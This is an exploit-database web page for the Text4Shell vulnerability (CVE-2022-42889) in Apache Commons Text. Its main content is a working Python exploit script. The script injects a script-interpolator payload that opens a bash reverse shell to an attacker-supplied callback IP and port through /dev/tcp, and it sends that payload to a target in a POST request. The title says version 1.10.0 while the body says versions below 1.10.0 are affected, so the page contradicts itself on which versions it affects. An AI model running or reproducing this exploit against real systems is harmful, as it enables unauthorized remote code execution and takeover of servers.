---
title: Apache Commons Text  1.10.0 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025050011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-04
fetch_date: 2025-10-06T22:23:48.409171
---

# Apache Commons Text  1.10.0 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Apache Commons Text 1.10.0 Remote Code Execution** **2025.05.03**  Credit:  **[Arjun Chaudhary](https://cxsecurity.com/author/Arjun%2BChaudhary/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-42889](https://cxsecurity.com/cveshow/CVE-2022-42889/ "Click to see CVE-2022-42889")**  CWE: **N/A** | |

# Exploit Title: Apache Commons Text 1.10.0 - Remote Code Execution
(Text4Shell - POST-based)
# Date: 2025-04-17
# Exploit Author: Arjun Chaudhary
# Vendor Homepage: https://commons.apache.org/proper/commons-text/
# Software Link:https://repo1.maven.org/maven2/org/apache/commons/commons-text/
# Version: Apache Commons Text < 1.10.0
# Tested on: Ubuntu 20.04 (Docker container), Java 11+, Apache Commons Text 1.9
# CVE: CVE-2022-42889
# Type: Remote Code Execution (RCE)
# Method: POST request, script interpolator
# Notes: This exploit demonstrates an RCE vector via POST data, differing
from common GET-based payloads.
#!/usr/bin/env python3
import urllib.parse
import http.client
import sys
def usage():
print("Usage: python3 text4shell.py <target\_ip> <callback\_ip> <callback\_port>")
print("Example: python3 text4shell.py 127.0.0.1 192.168.22.128 4444")
sys.exit(1)
if len(sys.argv) != 4:
usage()
target\_ip = sys.argv[1]
callback\_ip = sys.argv[2]
callback\_port = sys.argv[3]
raw\_payload = (
f"${{script:javascript:var p=java.lang.Runtime.getRuntime().exec("
f"['bash','-c','bash -c \\'exec bash -i >& /dev/tcp/{callback\_ip}/{callback\_port} 0>&1\\''])}}"
)
encoded\_payload = urllib.parse.quote(raw\_payload)
path = f"/?data={encoded\_payload}" # modify the parameter according to your target
print(f"[!] Remember to modify the parameter according to your target")
print(f"[+] Target: http://{target\_ip}{path}")
print(f"[+] Payload (decoded): {raw\_payload}")
conn = http.client.HTTPConnection(target\_ip, 80)
conn.request("POST", path, body="", headers={
"Host": target\_ip,
"Content-Type": "application/json",
"Content-Length": "0"
})
response = conn.getresponse()
print(f"[+] Response Status: {response.status}")
print(response.read().decode())
conn.close()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top